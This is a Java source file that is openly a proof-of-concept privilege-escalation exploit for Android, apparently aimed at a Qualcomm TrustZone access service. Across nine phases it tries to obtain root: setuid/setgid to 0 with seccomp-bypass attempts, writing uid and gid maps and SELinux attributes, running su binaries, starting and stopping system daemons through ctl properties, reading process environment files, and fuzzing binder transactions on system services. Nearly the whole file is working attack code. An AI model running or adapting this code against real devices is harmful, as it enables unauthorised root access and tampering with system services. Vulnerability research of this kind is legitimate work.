package com.poc;

import android.app.ActivityThread;
import android.app.AppGlobals;
import android.content.Context;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.ServiceManager;
import android.provider.Settings;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class Main {
    private static final String LOG_DIR = "/data/data/com.qualcomm.qti.qms.service.trustzoneaccess/";
    private static Context sContext;
    private static StringBuilder logBuilder = new StringBuilder();
    private static AtomicBoolean stopRequested = new AtomicBoolean(false);

    public static void main(String[] args) {
        try {
            Looper.prepare();
        } catch (Exception e) {
            appendLog("[!] Looper prep: " + e.getMessage());
        }

        sContext = getContext();
        if (sContext == null) {
            appendLog("[!] Failed to obtain Context, some tests will be skipped");
        } else {
            appendLog("[*] Context obtained: " + sContext.getClass().getName());
        }

        appendLog("========================================");
        appendLog("========== SSG_APP EXPLOIT TEST ==========");
        appendLog("Starting at " + new Date().toString());

        appendLog("========== PHASE 1: SystemProperties Manipulation ==========");
        testSystemProperties();

        appendLog("========== PHASE 2: Settings Write Test ==========");
        testSettingsWrite();

        appendLog("========== PHASE 3: File System Exploration ==========");
        exploreDeepFiles();

        appendLog("========== PHASE 4: setuid/setgid 0 Attempts (with seccomp bypass attempts) ==========");
        attemptSetuid0();

        appendLog("========== PHASE 5: Binder Transaction Fuzzing ==========");
        fuzzBinderTransactions();

        appendLog("========== PHASE 6: Process Attribute Manipulation ==========");
        manipulateProcessAttributes();

        appendLog("========== PHASE 7: /proc/self Exploitation ==========");
        exploitProcSelf();

        appendLog("========== PHASE 8: Attempting exec of suid binaries ==========");
        execSuidBinaries();

        appendLog("========== PHASE 9: Attempting kernel capset/capget ==========");
        testCaps();

        appendLog("========== ALL TESTS COMPLETED ==========");
        appendLog("========================================");
        saveLog();
        System.exit(0);
    }

    private static Context getContext() {
        Context ctx = null;
        try {
            ActivityThread at = ActivityThread.currentActivityThread();
            if (at != null) {
                Method getSystemContext = ActivityThread.class.getDeclaredMethod("getSystemContext");
                getSystemContext.setAccessible(true);
                ctx = (Context) getSystemContext.invoke(at);
                appendLog("[CTX] Got via ActivityThread.currentActivityThread().getSystemContext()");
                return ctx;
            }
        } catch (Exception e) {
            appendLog("[CTX] currentActivityThread failed: " + e.getMessage());
        }

        try {
            ctx = AppGlobals.getInitialApplication();
            if (ctx != null) {
                appendLog("[CTX] Got via AppGlobals.getInitialApplication()");
                return ctx;
            }
        } catch (Exception e) {
            appendLog("[CTX] AppGlobals failed: " + e.getMessage());
        }

        try {
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Method systemMain = activityThreadClass.getDeclaredMethod("systemMain");
            systemMain.setAccessible(true);
            Object at = systemMain.invoke(null);
            Method getSystemContext = activityThreadClass.getDeclaredMethod("getSystemContext");
            getSystemContext.setAccessible(true);
            ctx = (Context) getSystemContext.invoke(at);
            appendLog("[CTX] Got via ActivityThread.systemMain()");
            return ctx;
        } catch (Exception e) {
            appendLog("[CTX] systemMain failed: " + e.getMessage());
        }

        return null;
    }

    private static void testSystemProperties() {
        appendLog("[SYS] SystemProperties manipulation...");
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method setMethod = spClass.getDeclaredMethod("set", String.class, String.class);
            Method getMethod = spClass.getDeclaredMethod("get", String.class);
            setMethod.setAccessible(true);
            getMethod.setAccessible(true);

            String prop = "persist.test.poc";
            String val = "1";
            appendLog("  Setting " + prop + "=" + val);
            setMethod.invoke(null, prop, val);
            String read = (String) getMethod.invoke(null, prop);
            appendLog("  Read back: " + read);

            String[] ctlProps = {"ctl.start", "ctl.stop"};
            String[] testServices = {"surfaceflinger", "zygote", "audioserver", "netd", "vold"};
            for (String ctl : ctlProps) {
                for (String svc : testServices) {
                    try {
                        appendLog("  Trying " + ctl + "=" + svc);
                        setMethod.invoke(null, ctl, svc);
                        appendLog("    [SUCCESS] " + ctl + " set to " + svc);
                    } catch (Exception e) {
                        appendLog("    [FAIL] " + ctl + "=" + svc + " - " + e.getMessage());
                    }
                }
            }

            String[] dangerousProps = {
                "ro.debuggable", "ro.secure", "ro.adb.secure",
                "security.perf_harden", "ro.kernel.qemu", "ro.product.cpu.abi"
            };
            for (String p : dangerousProps) {
                try {
                    String v = (String) getMethod.invoke(null, p);
                    appendLog("  Read " + p + " = " + v);
                } catch (Exception e) {
                    appendLog("  Read " + p + " failed: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            appendLog("  SystemProperties error: " + e.getMessage());
        }
    }

    private static void testSettingsWrite() {
        appendLog("[SETTINGS] WRITE_SECURE_SETTINGS test...");
        if (sContext == null) {
            appendLog("  Context null, skipping");
            return;
        }
        try {
            String current = Settings.Global.getString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions");
            appendLog("  Current value: " + (current == null ? "(null)" : current));
            boolean success = Settings.Global.putString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions", "test");
            if (success) {
                appendLog("  [SUCCESS] WRITE_SECURE_SETTINGS works");
                Settings.Global.putString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions", current);
            } else {
                appendLog("  [FAIL] WRITE_SECURE_SETTINGS failed");
            }
        } catch (Exception e) {
            appendLog("  Exception: " + e.getMessage());
        }
    }

    private static void exploreDeepFiles() {
        appendLog("[FS] Deep file exploration...");
        String[] procFiles = {
            "/proc/self/status",
            "/proc/self/maps",
            "/proc/self/smaps",
            "/proc/self/limits",
            "/proc/self/statm",
            "/proc/self/cgroup",
            "/proc/version",
            "/proc/meminfo",
            "/proc/cpuinfo",
            "/proc/self/attr/current",
            "/proc/self/attr/prev",
            "/proc/self/attr/exec",
            "/proc/self/oom_score_adj",
            "/proc/self/comm",
            "/proc/self/cmdline"
        };
        for (String p : procFiles) {
            if (stopRequested.get()) break;
            readFileContent(p);
        }

        File tmp = new File("/data/local/tmp");
        if (tmp.exists()) {
            appendLog("[FS] /data/local/tmp exists, canRead=" + tmp.canRead());
            if (tmp.canRead()) {
                File[] children = tmp.listFiles();
                if (children != null) {
                    for (File f : children) {
                        appendLog("  " + f.getName());
                    }
                }
            }
        } else {
            appendLog("[FS] /data/local/tmp not exist");
        }

        File download = new File("/sdcard/Download");
        if (download.exists()) {
            File test = new File(download, "poc_write_test.txt");
            try (FileOutputStream fos = new FileOutputStream(test)) {
                fos.write("test\n".getBytes(StandardCharsets.UTF_8));
                appendLog("[FS] Write test succeeded");
            } catch (Exception e) {
                appendLog("[FS] Write test failed: " + e.getMessage());
            }
        }

        String[] sensitiveDirs = {
            "/data/data",
            "/data/system",
            "/data/misc",
            "/data/property",
            "/dev",
            "/sys",
            "/proc"
        };
        for (String d : sensitiveDirs) {
            File f = new File(d);
            if (f.exists() && f.isDirectory()) {
                try {
                    appendLog("[FS] " + d + " exists, canRead=" + f.canRead() + ", canWrite=" + f.canWrite());
                    if (f.canRead()) {
                        String[] list = f.list();
                        if (list != null && list.length > 0) {
                            appendLog("  Sample entries: " + String.join(", ", list.length > 5 ? java.util.Arrays.copyOf(list, 5) : list));
                        }
                    }
                } catch (Exception e) {
                    appendLog("[FS] Error accessing " + d + ": " + e.getMessage());
                }
            }
        }
    }

    private static void readFileContent(String path) {
        File f = new File(path);
        if (!f.exists()) {
            appendLog("[FS] " + path + " does not exist");
            return;
        }
        if (!f.canRead()) {
            appendLog("[FS] " + path + " not readable");
            return;
        }
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] data = new byte[1024];
            int len = fis.read(data);
            if (len > 0) {
                String content = new String(data, 0, len, StandardCharsets.UTF_8);
                appendLog("[FS] " + path + " content: " + content.trim());
            } else {
                appendLog("[FS] " + path + " empty");
            }
        } catch (Exception e) {
            appendLog("[FS] " + path + " error: " + e.getMessage());
        }
    }

    private static void attemptSetuid0() {
        appendLog("[SETUID] Attempting various setuid 0 techniques with seccomp bypass tries...");

        // Try Runtime.setuid (likely blocked)
        try {
            Method setuid = Runtime.class.getDeclaredMethod("setuid", int.class);
            setuid.setAccessible(true);
            int result = (int) setuid.invoke(Runtime.getRuntime(), 0);
            appendLog("  Runtime.setuid(0) returned: " + result);
        } catch (Exception e) {
            appendLog("  Runtime.setuid failed: " + e.getMessage());
        }

        // Try libcore.io.Os.setuid
        try {
            Class<?> osClass = Class.forName("libcore.io.Os");
            Method setuidMethod = osClass.getMethod("setuid", int.class);
            Class<?> libcore = Class.forName("libcore.io.Libcore");
            Field osField = libcore.getField("os");
            Object os = osField.get(null);
            setuidMethod.invoke(os, 0);
            appendLog("  libcore.io.Os.setuid(0) succeeded?");
        } catch (Exception e) {
            appendLog("  libcore.io.Os.setuid failed: " + e.getMessage());
        }

        // Try android.system.Os.setuid (Android 7+)
        try {
            Class<?> osClass = Class.forName("android.system.Os");
            Method setuidMethod = osClass.getMethod("setuid", int.class);
            setuidMethod.invoke(null, 0);
            appendLog("  android.system.Os.setuid(0) succeeded?");
        } catch (Exception e) {
            appendLog("  android.system.Os.setuid failed: " + e.getMessage());
        }

        // Try Process.setuid
        try {
            Class<?> processClass = Class.forName("android.os.Process");
            Method setuidMethod = processClass.getDeclaredMethod("setuid", int.class);
            setuidMethod.setAccessible(true);
            int result = (int) setuidMethod.invoke(null, 0);
            appendLog("  Process.setuid(0) returned: " + result);
        } catch (Exception e) {
            appendLog("  Process.setuid failed: " + e.getMessage());
        }

        // Try Process.setgid
        try {
            Class<?> processClass = Class.forName("android.os.Process");
            Method setgidMethod = processClass.getDeclaredMethod("setgid", int.class);
            setgidMethod.setAccessible(true);
            int result = (int) setgidMethod.invoke(null, 0);
            appendLog("  Process.setgid(0) returned: " + result);
        } catch (Exception e) {
            appendLog("  Process.setgid failed: " + e.getMessage());
        }

        // Try Process.setgroups
        try {
            Class<?> processClass = Class.forName("android.os.Process");
            Method setgroupsMethod = processClass.getDeclaredMethod("setgroups", int[].class);
            setgroupsMethod.setAccessible(true);
            int[] groups = {0};
            setgroupsMethod.invoke(null, (Object) groups);
            appendLog("  Process.setgroups([0]) succeeded?");
        } catch (Exception e) {
            appendLog("  Process.setgroups failed: " + e.getMessage());
        }

        // Try via FileDescriptor introspection (not setuid)
        try {
            Class<?> fileDescriptor = Class.forName("java.io.FileDescriptor");
            Field fdField = fileDescriptor.getDeclaredField("fd");
            fdField.setAccessible(true);
            int fd = fdField.getInt(java.io.FileDescriptor.in);
            appendLog("  STDIN_FD = " + fd);
        } catch (Exception e) {
            appendLog("  FD introspection failed: " + e.getMessage());
        }

        // Try using prctl to change uid? Not directly accessible.
        // Try via /proc/self/uid_map and setns (requires user ns)
        try {
            File uidMap = new File("/proc/self/uid_map");
            if (uidMap.exists() && uidMap.canWrite()) {
                try (FileOutputStream fos = new FileOutputStream(uidMap)) {
                    fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
                    appendLog("  Wrote to uid_map");
                } catch (Exception e) {
                    appendLog("  uid_map write failed: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            appendLog("  uid_map error: " + e.getMessage());
        }

        // Try writing to /proc/self/setgroups to allow setgroups
        try {
            File setgroups = new File("/proc/self/setgroups");
            if (setgroups.exists() && setgroups.canWrite()) {
                try (FileOutputStream fos = new FileOutputStream(setgroups)) {
                    fos.write("allow".getBytes(StandardCharsets.UTF_8));
                    appendLog("  /proc/self/setgroups write succeeded");
                } catch (Exception e) {
                    appendLog("  /proc/self/setgroups write failed: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            appendLog("  setgroups error: " + e.getMessage());
        }

        // Try using UserHandle? Not setuid.
    }

    private static void execSuidBinaries() {
        appendLog("[EXEC] Trying to execute suid binaries...");
        String[] candidates = {
            "/system/bin/su",
            "/system/xbin/su",
            "/system/bin/sh",
            "/system/bin/run-as",
            "/system/bin/ping",
            "/system/bin/busybox"
        };
        for (String path : candidates) {
            File f = new File(path);
            if (f.exists()) {
                appendLog("  Found " + path + ", canExecute=" + f.canExecute());
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{path, "-c", "id"});
                    java.io.InputStream is = p.getInputStream();
                    byte[] buf = new byte[1024];
                    int len = is.read(buf);
                    if (len > 0) {
                        appendLog("    Output: " + new String(buf, 0, len).trim());
                    }
                    p.waitFor();
                } catch (Exception e) {
                    appendLog("    Exec failed: " + e.getMessage());
                }
            }
        }

        // Try using ProcessBuilder
        try {
            ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c", "id");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            java.io.InputStream is = p.getInputStream();
            byte[] buf = new byte[1024];
            int len = is.read(buf);
            if (len > 0) {
                appendLog("  ProcessBuilder sh output: " + new String(buf, 0, len).trim());
            }
            p.waitFor();
        } catch (Exception e) {
            appendLog("  ProcessBuilder sh failed: " + e.getMessage());
        }
    }

    private static void testCaps() {
        appendLog("[CAPS] Trying capset/capget via reflection...");
        try {
            Class<?> libcoreOs = Class.forName("libcore.io.Os");
            Method capget = libcoreOs.getMethod("capget", int.class, int.class, int.class);
            Method capset = libcoreOs.getMethod("capset", int.class, int.class, int.class);
            Class<?> libcore = Class.forName("libcore.io.Libcore");
            Field osField = libcore.getField("os");
            Object os = osField.get(null);
            // capget(0,0,0) maybe?
            // Need proper header, but just try.
            try {
                int ret = (int) capget.invoke(os, 0, 0, 0);
                appendLog("  capget returned: " + ret);
            } catch (Exception e) {
                appendLog("  capget failed: " + e.getMessage());
            }
            try {
                int ret = (int) capset.invoke(os, 0, 0, 0);
                appendLog("  capset returned: " + ret);
            } catch (Exception e) {
                appendLog("  capset failed: " + e.getMessage());
            }
        } catch (Exception e) {
            appendLog("  capset/capget not available: " + e.getMessage());
        }

        // Try via Process.setCapabilities? Not in Android.
    }

    private static void fuzzBinderTransactions() {
        appendLog("[FUZZ] Fuzzing binder transactions on system services...");
        String[] services = {"activity", "window", "package", "power", "account", "battery", "alarm", "usb", "vibrator", "display", "input", "device_policy", "connectivity", "wifi", "bluetooth"};
        for (String svc : services) {
            try {
                IBinder binder = ServiceManager.getService(svc);
                if (binder == null) continue;
                appendLog("  Fuzzing " + svc);
                for (int code = 1; code <= 60; code++) {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken("android." + svc + ".I" + svc + "Service");
                        boolean success = binder.transact(code, data, reply, 0);
                        if (success) {
                            appendLog("    Code " + code + " succeeded, reply size=" + reply.dataSize());
                        }
                    } catch (Exception e) {
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                }
            } catch (Exception e) {
                appendLog("  Failed to get " + svc + ": " + e.getMessage());
            }
        }
    }

    private static void manipulateProcessAttributes() {
        appendLog("[PROC] Trying to manipulate /proc/self/attr...");
        try {
            File attrDir = new File("/proc/self/attr");
            if (attrDir.exists() && attrDir.isDirectory()) {
                String[] files = attrDir.list();
                if (files != null) {
                    for (String f : files) {
                        appendLog("  Found attr file: " + f);
                    }
                }
            }
            String[] attrFiles = {"current", "prev", "exec", "fscreate", "keycreate", "sockcreate"};
            for (String a : attrFiles) {
                File f = new File("/proc/self/attr/" + a);
                if (f.exists()) {
                    appendLog("  " + a + " exists, canRead=" + f.canRead() + ", canWrite=" + f.canWrite());
                    if (f.canWrite()) {
                        try (FileOutputStream fos = new FileOutputStream(f)) {
                            fos.write("u:r:system_r:s0\n".getBytes(StandardCharsets.UTF_8));
                            appendLog("    Wrote to " + a);
                        } catch (Exception e) {
                            appendLog("    Write to " + a + " failed: " + e.getMessage());
                        }
                    }
                }
            }
        } catch (Exception e) {
            appendLog("  attr manipulation error: " + e.getMessage());
        }

        appendLog("[PROC] Trying to adjust oom_score_adj...");
        try {
            File oom = new File("/proc/self/oom_score_adj");
            if (oom.exists() && oom.canWrite()) {
                try (FileOutputStream fos = new FileOutputStream(oom)) {
                    fos.write("-1000".getBytes(StandardCharsets.UTF_8));
                    appendLog("  Set oom_score_adj to -1000");
                } catch (Exception e) {
                    appendLog("  Failed to set oom_score_adj: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            appendLog("  oom_score_adj error: " + e.getMessage());
        }
    }

    private static void exploitProcSelf() {
        appendLog("[PROC] Exploring /proc/self/fd...");
        try {
            File fdDir = new File("/proc/self/fd");
            if (fdDir.exists() && fdDir.isDirectory()) {
                File[] fds = fdDir.listFiles();
                if (fds != null) {
                    for (File f : fds) {
                        try {
                            String target = java.nio.file.Files.readSymbolicLink(f.toPath()).toString();
                            appendLog("  FD " + f.getName() + " -> " + target);
                        } catch (Exception e) {
                            appendLog("  FD " + f.getName() + " cannot read link");
                        }
                    }
                }
            }
        } catch (Exception e) {
            appendLog("  fd exploration error: " + e.getMessage());
        }

        appendLog("[PROC] Trying to read /proc/self/environ...");
        readFileContent("/proc/self/environ");

        appendLog("[PROC] Trying to write to /proc/self/gid_map...");
        try {
            File gidMap = new File("/proc/self/gid_map");
            if (gidMap.exists() && gidMap.canWrite()) {
                try (FileOutputStream fos = new FileOutputStream(gidMap)) {
                    fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
                    appendLog("  Wrote to gid_map");
                } catch (Exception e) {
                    appendLog("  gid_map write failed: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            appendLog("  gid_map error: " + e.getMessage());
        }

        appendLog("[PROC] Trying to read /proc/self/uid_map...");
        readFileContent("/proc/self/uid_map");
    }

    private static void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        System.out.print(line);
    }

    private static void saveLog() {
        try {
            File dir = new File(LOG_DIR);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create log directory: " + LOG_DIR);
                return;
            }
            File file = new File(dir, "ssg_app_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== SSG_APP PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }
}
